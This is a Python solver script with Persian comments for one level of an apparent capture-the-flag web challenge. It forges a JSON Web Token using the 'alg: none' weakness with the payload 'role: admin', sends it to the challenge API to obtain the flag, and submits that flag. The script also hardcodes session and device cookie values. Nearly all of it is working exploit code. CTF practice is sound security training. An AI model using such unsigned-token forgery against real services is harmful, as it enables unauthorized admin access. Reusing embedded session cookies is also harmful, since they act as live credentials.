#!/usr/bin/env python3
"""
حل مرحله چهارم: شاهد روباه (shahed)
الگوریتم: جعل توکن JWT با آسیب‌پذیری alg: none و پی‌لود نقشی (role: admin)
منطق ضرب‌المثل: «به روباه گفتند شاهدت کیه؟ گفت دمم» -> خودامضایی / اعتماد بدون پرسش
"""

import requests
import json
import base64

def b64url(d):
    if isinstance(d, dict):
        d = json.dumps(d, separators=(',', ':')).encode('utf-8')
    elif isinstance(d, str):
        d = d.encode('utf-8')
    return base64.urlsafe_b64encode(d).decode('utf-8').rstrip('=')

def solve(cookies: dict):
    base_url = 'https://256.yektanet.tech/ramzolmasal/api'
    headers = {'Content-Type': 'application/json'}
    
    # 1. ساخت توکن جعل‌شده با الگوریتم none
    header = {'alg': 'none', 'typ': 'JWT'}
    payload = {'role': 'admin'}
    token = f'{b64url(header)}.{b64url(payload)}.'
    
    # 2. ارسال به api/status
    url = f'{base_url}/status?level=shahed&token={token}'
    print(f'[*] ارسال توکن به {url}...')
    r = requests.get(url, headers=headers, cookies=cookies)
    resp = r.json()
    
    flag = resp.get('level', {}).get('flag')
    print(f'[+] پرچم دریافت شد: {flag}')
    
    # 3. انتخاب و ثبت پرچم
    requests.post(f'{base_url}/select', headers=headers, cookies=cookies, json={'id': 'shahed'})
    sub = requests.post(f'{base_url}/submit', headers=headers, cookies=cookies, json={'flag': flag}).json()
    print(f'[*] نتیجه ثبت پرچم: {sub}')

if __name__ == '__main__':
    cookies = {
        'ctf_device': 'c58274c5d2b8e26db7753999381fcabb',
        'ctf_session': 'b309c321eed958ae047cc0eb89edfea75fdfa4931b4a14f27d0b9bf88ff05a1b'
    }
    solve(cookies)
